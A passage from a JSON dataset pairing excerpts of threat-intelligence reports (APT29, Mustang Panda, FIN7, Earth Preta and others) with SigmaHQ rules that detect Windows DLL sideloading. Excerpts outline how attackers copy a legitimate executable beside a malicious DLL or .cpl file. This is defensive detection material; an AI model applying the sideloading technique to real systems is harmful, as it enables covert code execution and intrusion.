        },
        "filter_main_legit_path": {
          "Image": [
            "C:\\Windows\\SysWOW64\\appverif.exe",
            "C:\\Windows\\System32\\appverif.exe"
          ],
          "ImageLoaded|startswith": [
            "C:\\Windows\\System32\\",
            "C:\\Windows\\SysWOW64\\",
            "C:\\Windows\\WinSxS\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_appverifui.yml"
  },
  "25": {
    "url": "https://web.archive.org/web/20231208015836/https://lab52.io/blog/2344-2/",
    "markdown": "# New invitation from APT29 to use CCleaner **July 12, 2023** Last month of May we were talking about the new APT29 campaign that we called “Information”. Recently, just a week ago, an unknown actor used similar techniques to APT29. This time APT29 is once again the focus after new techniques were identified in their operations. This post details the new techniques observed, in particular: - SVG Dropper - DLL used for infection - C2 behaviour ```image Alt: Infection chain Description: The image illustrates an infection chain used by APT29, detailing the steps involved in their attack method. It shows",
    "sigma_rule": {
      "title": "Potential CCleanerDU.DLL Sideloading",
      "id": "1fbc0671-5596-4e17-8682-f020a0b995dc",
      "status": "test",
      "description": "Detects potential DLL sideloading of \"CCleanerDU.dll\"",
      "references": [
        "https://web.archive.org/web/20231208015836/https://lab52.io/blog/2344-2/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-07-13",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1574.001",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": "\\CCleanerDU.dll"
        },
        "filter_main_path": {
          "Image|startswith": [
            "C:\\Program Files\\CCleaner\\",
            "C:\\Program Files (x86)\\CCleaner\\"
          ],
          "Image|endswith": [
            "\\CCleaner.exe",
            "\\CCleaner64.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "False positives could occur from other custom installation paths. Apply additional filters accordingly."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_ccleaner_du.yml"
  },
  "26": {
    "url": "https://web.archive.org/web/20231208015836/https://lab52.io/blog/2344-2/",
    "markdown": "# New invitation from APT29 to use CCleaner **July 12, 2023** Last month of May we were talking about the new APT29 campaign that we called “Information”. Recently, just a week ago, an unknown actor used similar techniques to APT29. This time APT29 is once again the focus after new techniques were identified in their operations. This post details the new techniques observed, in particular: - SVG Dropper - DLL used for infection - C2 behaviour ```image Alt: Infection chain Description: The image illustrates an infection chain used by APT29, detailing the steps involved in their attack method. It shows",
    "sigma_rule": {
      "title": "Potential CCleanerReactivator.DLL Sideloading",
      "id": "3735d5ac-d770-4da0-99ff-156b180bc600",
      "status": "test",
      "description": "Detects potential DLL sideloading of \"CCleanerReactivator.dll\"",
      "references": [
        "https://web.archive.org/web/20231208015836/https://lab52.io/blog/2344-2/"
      ],
      "author": "X__Junior",
      "date": "2023-07-13",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1574.001",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": "\\CCleanerReactivator.dll"
        },
        "filter_main_path": {
          "Image|startswith": [
            "C:\\Program Files\\CCleaner\\",
            "C:\\Program Files (x86)\\CCleaner\\"
          ],
          "Image|endswith": "\\CCleanerReactivator.exe"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "False positives could occur from other custom installation paths. Apply additional filters accordingly."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_ccleaner_reactivator.yml"
  },
  "27": {
    "url": "https://web.archive.org/web/20250203175446/https://blogs.blackberry.com/en/2022/12/mustang-panda-uses-the-russian-ukrainian-war-to-attack-europe-and-asia-pacific-targets",
    "markdown": "# Mustang Panda Uses the Russian-Ukrainian War to Attack Europe and Asia Pacific Targets **Category:** CYBERSECURITY **Date:** 12.06.22 *Mustang Panda* continues targeting countries across Europe and Asia Pacific, utilizing current geopolitical events to their advantage. Their attack chain remains consistent, with the continued use of archive files, shortcut files, malicious loaders, and the use of PlugX malware. Based on the lure covered in this blog, the goal of this particular operation appears to be collecting sensitive information from European countries and states from Asia, which might be supporting Western countries. ### Summary As part of ongoing hunting and continuous monitoring",
    "sigma_rule": {
      "title": "Potential DLL Sideloading Via ClassicExplorer32.dll",
      "id": "caa02837-f659-466f-bca6-48bde2826ab4",
      "status": "test",
      "description": "Detects potential DLL sideloading using ClassicExplorer32.dll from the Classic Shell software",
      "references": [
        "https://web.archive.org/web/20250203175446/https://blogs.blackberry.com/en/2022/12/mustang-panda-uses-the-russian-ukrainian-war-to-attack-europe-and-asia-pacific-targets",
        "https://any.run/report/f70d3601fb456a18ed7e7ed599d10783447016da78234f5dca61b8bd3a084a15/6d8cabb0-dcda-44b6-8050-28d6ce281687/"
      ],
      "author": "frack113",
      "date": "2022-12-13",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1574.001",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection_classicexplorer": {
          "ImageLoaded|endswith": "\\ClassicExplorer32.dll"
        },
        "filter_classicexplorer": {
          "ImageLoaded|startswith": "C:\\Program Files\\Classic Shell\\"
        },
        "condition": "selection_classicexplorer and not filter_classicexplorer"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_classicexplorer32.yml"
  },
  "28": {
    "url": "https://any.run/report/f70d3601fb456a18ed7e7ed599d10783447016da78234f5dca61b8bd3a084a15/6d8cabb0-dcda-44b6-8050-28d6ce281687/",
    "markdown": "# General Info | | | | ----------------- | ------------------------------------------------------------------------------------------------- | | **File name** | Political Guidance for the new EU approach towards Russia.rar | | **Full analysis** | https://app.any.run/tasks/6d8cabb0-dcda-44b6-8050-28d6ce281687 | | **Verdict** | Malicious activity | | **Analysis date** | October 26, 2022 at 14:57:03 | | **OS** | Windows 7 Professional Service Pack 1 (build: 7601, 32 bit) | | **Indicators** | Process was added to the startup, Executable file was dropped, Task contains several apps running | | **MIME** | application/x-rar | | **File info** | RAR archive data, v5 | | **MD5** | 7177AB83A40A4111EB0170A76E92142B | |",
    "sigma_rule": {
      "title": "Potential DLL Sideloading Via ClassicExplorer32.dll",
      "id": "caa02837-f659-466f-bca6-48bde2826ab4",
      "status": "test",
      "description": "Detects potential DLL sideloading using ClassicExplorer32.dll from the Classic Shell software",
      "references": [
        "https://web.archive.org/web/20250203175446/https://blogs.blackberry.com/en/2022/12/mustang-panda-uses-the-russian-ukrainian-war-to-attack-europe-and-asia-pacific-targets",
        "https://any.run/report/f70d3601fb456a18ed7e7ed599d10783447016da78234f5dca61b8bd3a084a15/6d8cabb0-dcda-44b6-8050-28d6ce281687/"
      ],
      "author": "frack113",
      "date": "2022-12-13",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1574.001",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection_classicexplorer": {
          "ImageLoaded|endswith": "\\ClassicExplorer32.dll"
        },
        "filter_classicexplorer": {
          "ImageLoaded|startswith": "C:\\Program Files\\Classic Shell\\"
        },
        "condition": "selection_classicexplorer and not filter_classicexplorer"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_classicexplorer32.yml"
  },
  "29": {
    "url": "https://www.hexacorn.com/blog/2024/01/06/1-little-known-secret-of-fondue-exe/",
    "markdown": "# 1 little known secret of fondue.exe Posted on 2024-01-06 Same as in the previous case, we can copy the main executable *fondue.exe* to a different folder f.ex. *c:\\test* and start it from there, loading the c:\\test\\ *appwiz.cpl* we control in the process. ```image Alt: fondue Description: The image displays a detailed log of operations performed by the process 'fondue.exe' related to the file 'appwiz.cpl' located in the 'C:\\test' directory. It includes timestamps, process IDs (PIDs), and the results of various file operations such as 'CreateFile', 'CloseFile', and 'QueryBasicInformationFile'. The log shows the success of most operations, with a final",
    "sigma_rule": {
      "title": "System Control Panel Item Loaded From Uncommon Location",
      "id": "2b140a5c-dc02-4bb8-b6b1-8bdb45714cde",
      "status": "test",
      "description": "Detects image load events of system control panel items (.cpl) from uncommon or non-system locations which might be the result of sideloading.",
      "references": [
        "https://www.hexacorn.com/blog/2024/01/06/1-little-known-secret-of-fondue-exe/",
        "https://www.hexacorn.com/blog/2024/01/01/1-little-known-secret-of-hdwwiz-exe/"
      ],
      "author": "Anish Bogati",
      "date": "2024-01-09",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036"
      ],
      "logsource": {
        "product": "windows",
        "category": "image_load"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": [
            "\\hdwwiz.cpl",
            "\\appwiz.cpl"
          ]
        },
        "filter_main_legit_location": {
          "ImageLoaded|contains": [
            ":\\Windows\\System32\\",
            ":\\Windows\\SysWOW64\\",
            ":\\Windows\\WinSxS\\"
          ]
        },
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_cpl_from_non_system_location.yml"
  },
  "30": {
    "url": "https://www.hexacorn.com/blog/2024/01/01/1-little-known-secret-of-hdwwiz-exe/",
    "markdown": "# 1 little known secret of hdwwiz.exe Posted on 2024-01-01 There is a number of .cpl files that can be loaded using their OS-native executable equivalents f.ex *hdwwiz.exe* loads *hdwwiz.cpl*. As such, we can copy *hdwwiz.exe* to a different folder f.ex. c:\\test and load malicious *hdwwiz.cpl* from the very same location f.ex.: ```image Alt: hdwwiz Description: The image displays a command prompt interface showing a series of commands executed in a Windows environment. The commands include 'dir /b' which lists files in the directory, revealing 'hdwwiz.cpl', and a 'copy' command that duplicates 'hdwwiz.exe' from the system32 folder to a new",
    "sigma_rule": {
      "title": "System Control Panel Item Loaded From Uncommon Location",
      "id": "2b140a5c-dc02-4bb8-b6b1-8bdb45714cde",
      "status": "test",
      "description": "Detects image load events of system control panel items (.cpl) from uncommon or non-system locations which might be the result of sideloading.",
      "references": [
        "https://www.hexacorn.com/blog/2024/01/06/1-little-known-secret-of-fondue-exe/",
        "https://www.hexacorn.com/blog/2024/01/01/1-little-known-secret-of-hdwwiz-exe/"
      ],
      "author": "Anish Bogati",
      "date": "2024-01-09",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036"
      ],
      "logsource": {
        "product": "windows",
        "category": "image_load"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": [
            "\\hdwwiz.cpl",
            "\\appwiz.cpl"
          ]
        },
        "filter_main_legit_location": {
          "ImageLoaded|contains": [
            ":\\Windows\\System32\\",
            ":\\Windows\\SysWOW64\\",
            ":\\Windows\\WinSxS\\"
          ]
        },
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_cpl_from_non_system_location.yml"
  },
  "31": {
    "url": "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
    "markdown": "# FIN7 tradecraft seen in attacks against Veeam backup servers 26 April 2023 ## Updates: 28-04-2023 1100 UTC - We have reviewed and updated this blogpost to reflect our latest findings: - We have added information regarding the file “445.ps1”, which was missing at the time of writing. - We have updated this blogpost to broaden our attribution from FIN7 to FIN7 or a threat actor utilizing FIN7 tradecraft. ## Introduction WithSecure Intelligence identified attacks which occurred in late March 2023 against internet-facing servers running Veeam Backup & Replication software. Our research indicates that the intrusion set used in these",
    "sigma_rule": {
      "title": "Potential DLL Sideloading Of Libcurl.DLL Via GUP.EXE",
      "id": "e49b5745-1064-4ac1-9a2e-f687bc2dd37e",
      "status": "test",
      "description": "Detects potential DLL sideloading of \"libcurl.dll\" by the \"gup.exe\" process from an uncommon location",
      "references": [
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-05",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1574.001",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\gup.exe",
          "ImageLoaded|endswith": "\\libcurl.dll"
        },
        "filter_main_notepad_plusplus": {
          "Image|endswith": "\\Notepad++\\updater\\GUP.exe"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_gup_libcurl.yml"
  },
  "32": {
    "url": "https://www.trendmicro.com/en_us/research/23/c/earth-preta-updated-stealthy-strategies.html",
    "markdown": "# Pack it Secretly: Earth Preta’s Updated Stealthy Strategies **APT & Targeted Attacks** **Date:** March 23, 2023 --- Earth Preta has actively been changing its tools, tactics, and procedures (TTPs) to bypass security solutions. In this blog entry, we will introduce and analyze the tools and malware used by the threat actor in its most recent campaigns. --- ## Infection chain In our previous research, we disclosed and analyzed a new campaign initiated by the threat actor group Earth Preta (aka Mustang Panda). In a more recent campaign we’ve been tracking, we discovered Earth Preta delivering lure archives via spear-phishing",
    "sigma_rule": {
      "title": "Potential Libvlc.DLL Sideloading",
      "id": "bf9808c4-d24f-44a2-8398-b65227d406b6",
      "status": "test",
      "description": "Detects potential DLL sideloading of \"libvlc.dll\", a DLL that is legitimately used by \"VLC.exe\"",
      "references": [
        "https://www.trendmicro.com/en_us/research/23/c/earth-preta-updated-stealthy-strategies.html",
        "https://hijacklibs.net/entries/3rd_party/vlc/libvlc.html"
      ],
      "author": "X__Junior",
      "date": "2023-04-17",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1574.001",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": "\\libvlc.dll"
        },
        "filter_main_vlc": {
          "ImageLoaded|startswith": [
            "C:\\Program Files (x86)\\VideoLAN\\VLC\\",
            "C:\\Program Files\\VideoLAN\\VLC\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "False positives are expected if VLC is installed in non-default locations"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_libvlc.yml"
  },
  "33": {
    "url": "https://hijacklibs.net/entries/3rd_party/vlc/libvlc.html",
    "markdown": "# libvlc.dll Part of the Hijack Libs project. ## Description ### Type **DLL Sideloading** (1 EXE) By copying (and optionally renaming) a vulnerable application to a user-writeable folder, alongside a malicious `libvlc.dll`, arbitrary code can be executed through the legitimate application. *See also MITRE ATT&CK® technique T1574.002: Hijack Execution Flow: DLL Side-Loading.* ### Vendor VLC ### Resources - news.sophos.com - www.microsoft.com ### Last updated over 1 year ago (2022-11-18) ## Expected Locations The file `libvlc.dll` is normally found in the following path: - `%PROGRAMFILES%\\VideoLAN\\VLC` ## Vulnerable Executables The following executable attempts to load `libvlc.dll`: - `%PROGRAMFILES%\\VideoLAN\\VLC\\vlc.exe` **File hash available**: VirusTotal",
    "sigma_rule": {
      "title": "Potential Libvlc.DLL Sideloading",
      "id": "bf9808c4-d24f-44a2-8398-b65227d406b6",
      "status": "test",
      "description": "Detects potential DLL sideloading of \"libvlc.dll\", a DLL that is legitimately used by \"VLC.exe\"",
      "references": [
        "https://www.trendmicro.com/en_us/research/23/c/earth-preta-updated-stealthy-strategies.html",
        "https://hijacklibs.net/entries/3rd_party/vlc/libvlc.html"
      ],
      "author": "X__Junior",
      "date": "2023-04-17",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1574.001",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": "\\libvlc.dll"
        },
        "filter_main_vlc": {
          "ImageLoaded|startswith": [
            "C:\\Program Files (x86)\\VideoLAN\\VLC\\",
            "C:\\Program Files\\VideoLAN\\VLC\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "False positives are expected if VLC is installed in non-default locations"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_libvlc.yml"
  },
  "34": {
    "url": "https://www.securonix.com/blog/seolurker-attack-campaign-uses-seo-poisoning-fake-google-ads-to-install-malware/",
    "markdown": "# Securonix Threat Labs Security Advisory: New SEO#LURKER Attack Campaign: Threat Actors Use SEO Poisoning and Fake Google Ads to Lure Victims Into Installing Malware ### tldr: An interesting ongoing SEO poisoning/malvertising campaign leveraging WinSCP lures along with a stealthy infection chain lures victims into installing malware (alongside the legitimate WinSCP software). Attackers are likely leveraging dynamic search ads which let threat actors inject their own malicious code while mimicking legitimate sources like Google search pages. A rather steep uptick in malicious advertising (malvertising) has been observed, especially in the last year which involves threat actors paying either your favorite",
    "sigma_rule": {
      "title": "Potential Python DLL SideLoading",
      "id": "d36f7c12-14a3-4d48-b6b8-774b9c66f44d",
      "status": "experimental",
      "description": "Detects potential DLL sideloading of Python DLL files.",
      "references": [
        "https://www.securonix.com/blog/seolurker-attack-campaign-uses-seo-poisoning-fake-google-ads-to-install-malware/",
        "https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/",
        "https://github.com/wietze/HijackLibs/tree/dc9c9f2f94e6872051dab58fbafb043fdd8b4176/yml/3rd_party/python"
      ],
      "author": "Swachchhanda Shrawan Poudel",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": [
            "\\python39.dll",
            "\\python310.dll",
            "\\python311.dll",
            "\\python312.dll"
          ]
        },
        "filter_main_default_install_paths": [
          {
            "ImageLoaded|startswith": [
              "C:\\Program Files\\Python3",
              "C:\\Program Files (x86)\\Python3"
            ]
          },
          {
            "ImageLoaded|contains": "\\AppData\\Local\\Programs\\Python\\Python3"
          }
        ],
        "filter_optional_visual_studio": {
          "ImageLoaded|startswith": "C:\\Program Files\\Microsoft Visual Studio\\"
        },
        "filter_optional_cpython": {
          "ImageLoaded|contains": [
            "\\cpython\\externals\\",
            "\\cpython\\PCbuild\\"
          ]
        },
        "filter_main_legit_signature_details": {
          "Product": "Python",
          "Signed": "true",
          "Description": "Python",
          "Company": "Python Software Foundation"
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Legitimate software using Python DLLs"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_python.yml"
  },
  "35": {
    "url": "https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/",
    "markdown": "# Nitrogen Campaign Drops Sliver and Ends With BlackCat Ransomware **Categories:** BlackCat, Cobalt Strike, Ransomware, Sliver **Published on:** September 30, 2024 --- ## Key Takeaways - In November 2023, a BlackCat ransomware intrusion was identified, initiated by Nitrogen malware hosted on a website impersonating Advanced IP Scanner. - Nitrogen was used to deploy Sliver and Cobalt Strike beacons on the beachhead host via Python scripts. - The threat actor used PowerSploit, SharpHound, and native Windows utilities for network enumeration, and Impacket for lateral movement after harvesting domain credentials. - Restic, an open-source backup tool, was deployed on a file server",
    "sigma_rule": {
      "title": "Potential Python DLL SideLoading",
      "id": "d36f7c12-14a3-4d48-b6b8-774b9c66f44d",
      "status": "experimental",
      "description": "Detects potential DLL sideloading of Python DLL files.",
      "references": [
        "https://www.securonix.com/blog/seolurker-attack-campaign-uses-seo-poisoning-fake-google-ads-to-install-malware/",
        "https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/",
        "https://github.com/wietze/HijackLibs/tree/dc9c9f2f94e6872051dab58fbafb043fdd8b4176/yml/3rd_party/python"
      ],
      "author": "Swachchhanda Shrawan Poudel",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": [
            "\\python39.dll",
            "\\python310.dll",
            "\\python311.dll",
            "\\python312.dll"
          ]
        },
        "filter_main_default_install_paths": [
          {
            "ImageLoaded|startswith": [
              "C:\\Program Files\\Python3",
              "C:\\Program Files (x86)\\Python3"
            ]
          },
          {
            "ImageLoaded|contains": "\\AppData\\Local\\Programs\\Python\\Python3"
          }
        ],
        "filter_optional_visual_studio": {
          "ImageLoaded|startswith": "C:\\Program Files\\Microsoft Visual Studio\\"
        },
        "filter_optional_cpython": {
          "ImageLoaded|contains": [
            "\\cpython\\externals\\",
            "\\cpython\\PCbuild\\"
          ]
        },
        "filter_main_legit_signature_details": {
          "Product": "Python",
          "Signed": "true",
          "Description": "Python",
          "Company": "Python Software Foundation"
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Legitimate software using Python DLLs"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_python.yml"
  },
  "36": {
    "url": "https://github.com/wietze/HijackLibs/tree/dc9c9f2f94e6872051dab58fbafb043fdd8b4176/yml/3rd_party/python",
    "markdown": "# HijackLibs / yml / 3rd_party / python ## Files | Name | Last Commit Message | Last Commit Date | |---------------|----------------------------------------------------------|------------------| | python310.yml | Add multiple new DLLs and new vendors (Pull Request #76) | May 14, 2024 | | python311.yml | Added python311.dll sideloading (Pull Request #90) | Oct 2, 2024 | | python39.yml | Update ExpectedLocations (Pull Request #21) | Oct 26, 2022 |",
    "sigma_rule": {
      "title": "Potential Python DLL SideLoading",
      "id": "d36f7c12-14a3-4d48-b6b8-774b9c66f44d",
      "status": "experimental",
      "description": "Detects potential DLL sideloading of Python DLL files.",
      "references": [
        "https://www.securonix.com/blog/seolurker-attack-campaign-uses-seo-poisoning-fake-google-ads-to-install-malware/",
        "https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/",
        "https://github.com/wietze/HijackLibs/tree/dc9c9f2f94e6872051dab58fbafb043fdd8b4176/yml/3rd_party/python"
      ],
      "author": "Swachchhanda Shrawan Poudel",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": [
            "\\python39.dll",
            "\\python310.dll",
            "\\python311.dll",
            "\\python312.dll"
          ]
        },
        "filter_main_default_install_paths": [
          {
            "ImageLoaded|startswith": [
              "C:\\Program Files\\Python3",
              "C:\\Program Files (x86)\\Python3"
            ]
          },
          {
            "ImageLoaded|contains": "\\AppData\\Local\\Programs\\Python\\Python3"
          }
        ],
        "filter_optional_visual_studio": {
          "ImageLoaded|startswith": "C:\\Program Files\\Microsoft Visual Studio\\"
        },
        "filter_optional_cpython": {
          "ImageLoaded|contains": [
            "\\cpython\\externals\\",
            "\\cpython\\PCbuild\\"
          ]
        },
        "filter_main_legit_signature_details": {
          "Product": "Python",
          "Signed": "true",
          "Description": "Python",
          "Company": "Python Software Foundation"
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Legitimate software using Python DLLs"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_python.yml"
  },
  "37": {
    "url": "https://www.trendmicro.com/en_us/research/23/c/iron-tiger-sysupdate-adds-linux-targeting.html",
    "markdown": "# Iron Tiger’s SysUpdate Reappears, Adds Linux Targeting We detail the update that advanced persistent threat (APT) group Iron Tiger made on the custom malware family SysUpdate. In this version, we also found components that enable the malware to compromise Linux systems. **Date:** March 01, 2023 --- Iron Tiger is an advanced persistent threat (APT) group that has been focused primarily on cyberespionage for more than a decade. In 2022, we noticed that they updated SysUpdate, one of their custom malware families, to include new features and add malware infection support for the Linux platform. We found the oldest sample",
    "sigma_rule": {
      "title": "Potential Rcdll.DLL Sideloading",
      "id": "6e78b74f-c762-4800-82ad-f66787f10c8a",
      "status": "test",
      "description": "Detects potential DLL sideloading of rcdll.dll",
      "references": [
        "https://www.trendmicro.com/en_us/research/23/c/iron-tiger-sysupdate-adds-linux-targeting.html"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-03-13",
      "modified": "2023-03-15",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1574.001",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": "\\rcdll.dll"
        },
        "filter": {
          "ImageLoaded|startswith": [
            "C:\\Program Files (x86)\\Microsoft Visual Studio\\",
            "C:\\Program Files (x86)\\Windows Kits\\"
          ]
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_rcdll.yml"
  },
  "38": {
    "url": "https://www.hexacorn.com/blog/2023/06/07/this-lolbin-doesnt-exist/",
    "markdown": "# This LOLBIN doesn’t exist… Posted on 2023-06-07 I have written about Nullsoft installer a few times before. I am a bit fascinated by it, because there is not that much research about it, in general, and even less – about its esoteric, yet omnipresent DLL plug-ins… One of the more interesting plug-ins that I know of, and yet, one that you will never really see residing on any system, is… *ShellDispatch.dll*. It’s a rarely used Nullsoft Plug-In DLL that is known to be used by the installer of WinAmp, yes.. THE WinAmp… and even there… it is used temporarily,",
    "sigma_rule": {
      "title": "Potential ShellDispatch.DLL Sideloading",
      "id": "844f8eb2-610b-42c8-89a4-47596e089663",
      "status": "test",
      "description": "Detects potential DLL sideloading of \"ShellDispatch.dll\"",
      "references": [
        "https://www.hexacorn.com/blog/2023/06/07/this-lolbin-doesnt-exist/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-06-20",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1574.001",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": "\\ShellDispatch.dll"
        },
        "filter_main_legit_path": [
          {
            "ImageLoaded|contains|all": [
              ":\\Users\\",
              "\\AppData\\Local\\Temp\\"
            ]
          },
          {
            "ImageLoaded|contains": ":\\Windows\\Temp\\"
          }
        ],
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Some installers may trigger some false positives"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_shelldispatch.yml"
  },
  "39": {
    "url": "https://web.archive.org/web/20231129000043/https://lab52.io/blog/new-mustang-pandas-campaing-against-australia/",
    "markdown": "# New Mustang Panda’s campaign against Australia **May 03, 2023** AUKUS (Australia-United Kingdom-United States) is a strategic military alliance between these territories that became a reality in 2021, whose main objective is to build nuclear-powered submarines to counter the threat from China in the Indo-Pacific region. This agreement also includes the sharing of cyber capabilities and other submarine technologies. Some sources point out that this is not a security pact, but is rather intended to “elevate the intelligence and deterrence value of conventional capabilities”. The key facts of this alliance are as follows: - The US pledged to invest $4.6",
    "sigma_rule": {
      "title": "Potential SolidPDFCreator.DLL Sideloading",
      "id": "a2edbce1-95c8-4291-8676-0d45146862b3",
      "status": "test",
      "description": "Detects potential DLL sideloading of \"SolidPDFCreator.dll\"",
      "references": [
        "https://web.archive.org/web/20231129000043/https://lab52.io/blog/new-mustang-pandas-campaing-against-australia/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-05-07",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1574.001",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": "\\SolidPDFCreator.dll"
        },
        "filter_main_path": {
          "Image|endswith": "\\SolidPDFCreator.exe",
          "ImageLoaded|startswith": [
            "C:\\Program Files (x86)\\SolidDocuments\\SolidPDFCreator\\",
            "C:\\Program Files\\SolidDocuments\\SolidPDFCreator\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_solidpdfcreator.yml"
  },
  "40": {
    "url": "https://www.sentinelone.com/labs/lockbit-ransomware-side-loads-cobalt-strike-beacon-with-legitimate-vmware-utility/",
